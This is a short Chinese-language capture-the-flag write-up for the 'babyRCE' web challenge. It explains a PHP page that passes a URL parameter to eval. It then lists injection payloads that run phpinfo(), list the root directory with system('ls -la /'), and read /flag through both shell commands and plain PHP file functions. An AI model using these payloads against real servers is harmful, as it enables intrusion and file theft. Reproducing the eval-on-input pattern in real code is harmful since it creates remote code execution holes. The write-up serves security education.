---
title: babyRCE
author: SMJB
difficulty: Trivial
category: Web
image: ghcr.io/svuctf/svuctf-helloworld-2024/rce:latest
port: 80
writeup_author: 13m0n4de
tags:
  - php
  - rce
reference:
---

# babyRCE

## 题目描述

## 题目解析

```php
<?php

highlight_file(__FILE__);

if (isset($_GET['rce'])) {
    eval($_GET['rce']);
}

```

- `highlight_file(__FILE__);`：这行代码会显示当前文件的源代码
- `if (isset($_GET['rce']))`：检查 URL 参数中是否存在名为 `rce` 的参数
- `eval($_GET['rce']);`：如果存在 `rce` 参数，则使用 PHP 的 `eval` 函数执行这个参数的内容

[eval](https://www.php.net/manual/en/function.eval.php) 是一个非常危险的 PHP 函数，它可以执行任意的 PHP 代码。当用户可以控制 `eval` 函数的输入时，就可以执行任意 PHP 代码，造成远程代码执行 (Remote Code Execution, RCE) 漏洞。

首先，我们可以先用一个简单的 PHP 代码来测试漏洞是否存在：

```
http://<IP>:<PORT>/?rce=phpinfo();
```

如果看到 PHP 配置信息页面，说明我们成功执行了 PHP 代码。

之后我们可以利用 [system](https://www.php.net/manual/en/function.system.php) 函数执行系统命令。

列出根目录文件：

```
http://<IP>:<PORT>/?rce=system("ls -la /");
```

查看 `/flag` 文件内容：

```
http://<IP>:<PORT>/?rce=system("cat /flag");
```

不使用系统命令也是可以的，可以只用 PHP 代码完成以上操作：

```
http://<IP>:<PORT>/?rce=print_r(scandir('/'));
http://<IP>:<PORT>/?rce=echo file_get_contents('/flag');
```

只是大多时候，执行系统命令会更加方便。
